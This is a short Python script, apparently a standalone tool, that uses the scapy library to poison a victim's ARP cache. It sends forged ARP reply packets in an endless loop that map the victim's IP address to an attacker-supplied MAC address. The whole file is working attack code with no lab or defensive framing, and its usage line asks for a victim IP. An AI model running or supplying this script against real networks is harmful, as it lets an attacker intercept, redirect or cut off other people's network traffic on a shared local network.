from scapy.all import ARP, send
import sys

def arp_poison(victim_ip, fake_mac):
    arp_packet = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fake_mac)
    print(f"Injecting fake ARP entry: {victim_ip} -> {fake_mac}")
    try:
        while True:
            send(arp_packet, verbose=False)
    except KeyboardInterrupt:
        print("\nARP Poisoning stopped.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python arp_poisoning.py <victim_ip> <fake_mac>")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    fake_mac = sys.argv[2]
    arp_poison(victim_ip, fake_mac)
